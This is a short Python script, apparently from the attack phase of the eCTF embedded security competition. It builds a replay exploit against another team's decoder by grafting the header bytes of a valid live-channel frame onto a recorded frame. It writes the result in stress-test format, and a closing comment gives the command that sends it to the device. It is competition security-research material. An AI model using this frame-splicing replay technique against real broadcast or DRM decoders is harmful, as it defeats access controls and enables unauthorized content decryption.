"""Zhong: recording playback exp for binghamton"""
import json
import base64
# get A frame from live channel 1 which we own valid and active subscription
frame_channel_1=b't&\xcc\x80$\xb5\x1b({\xaf`\t\x17U\x18\xcd\xf8\x12\xac\xb4\x99\xeb\x8ag\xe9\xe9\xc3}\xce\x86\xd0\xf1\xa6\xe4@F+>\xaa\xdd\xe2\xc2\xde\x19\x02\xfc\x84l\xc5L\x7fZ\xeb\x1c(\xa4\xc1\'"\xda\xeeT\xc6\x804\x96nI\x9e\x01\x86\xa26\x06\xa5\xa2\xe5L\xb2\n'
hex_frame_channel_1=frame_channel_1[:32].hex()
# replace first 16 bytes of recording back frame with frame_channel_1 to patch the good timestamp
with open('/Users/jiachengzhong/project/jhu-research/ectf/attack-phase/binghamton_package/recording.json') as f:
  recording = json.load(f)
# cut one frame out
output = recording[0]
# twist
output["encoded"] = hex_frame_channel_1 + output["encoded"][32:]
# test
# output["encoded"] = frame_channel_1_new.hex()[:32] + frame_channel_1.hex()[32:]
# print(len(output["encoded"]))

# save as stress test format convinient for replay the frame
output_stress_format = []
output_stress_format.append([1, base64.b64encode(bytes.fromhex(output["encoded"])).decode(), output['timestamp']])
with open('/Users/jiachengzhong/project/jhu-research/ectf/attack-phase/binghamton_package/recording_playback_exp.json', 'w') as f:
  json.dump(output_stress_format, f)
  
# final attack
# python -m ectf25.utils.stress_test --test-size 64 decode /dev/tty.usbmodem21402 recording_playback_exp.json
